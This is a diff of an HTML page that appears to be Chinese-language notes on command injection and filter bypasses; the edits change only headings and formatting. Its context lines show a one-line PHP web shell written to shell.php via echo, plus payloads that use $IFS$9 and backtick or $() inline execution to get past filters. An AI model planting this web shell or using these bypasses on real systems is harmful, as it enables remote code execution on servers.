@@ -972,9 +972,7 @@
 <li><p><code>echo &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot;&gt;shell.php</code></p>
 </li>
 </ul>
-</li>
-<li><p>绕过技巧</p>
-<ul>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><ul>
 <li><p><font color='red'>1.管道符</font></p>
 <ul>
 <li><p>linux<img src="https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg" class="lazyload placeholder" data-srcset="https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
@@ -1025,11 +1023,11 @@
 </li>
 </ul>
 </li>
-<li><p>5.其他技巧</p>
+<li><p><font color='red'>5.其他技巧</font></p>
 <ul>
 <li><p>1.内联执行—就是将``或$()内命令的输出作为输入执行</p>
 <ul>
-<li><p>cat$IFS$9<code>ls</code></p>
+<li><p>cat$IFS$9`ls`</p>
 </li>
 <li><p>cat$IFS$9$(ls)</p>
 </li>
